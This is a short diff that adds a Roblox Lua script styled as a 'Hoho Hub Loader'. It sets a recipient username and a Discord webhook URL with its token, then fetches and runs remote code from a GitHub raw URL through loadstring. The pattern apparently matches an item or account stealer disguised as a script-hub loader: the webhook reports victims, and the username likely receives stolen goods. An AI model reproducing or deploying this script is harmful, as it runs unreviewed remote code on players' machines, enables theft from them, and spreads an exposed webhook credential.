@@ -1,0 +1,6 @@
+
+_G.Username = "amazoncode101"
+_G.HubName = "Hoho Hub Loader"
+_G.WebhookUrl = “https://discord.com/api/webhooks/1094173702620467240/lNT527jJthE1Dm8BVPQNlNSLdLMTOxko0NfKOUdEI4HfyxbgQE0YrGnH1SLPN-ejqTdH”
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
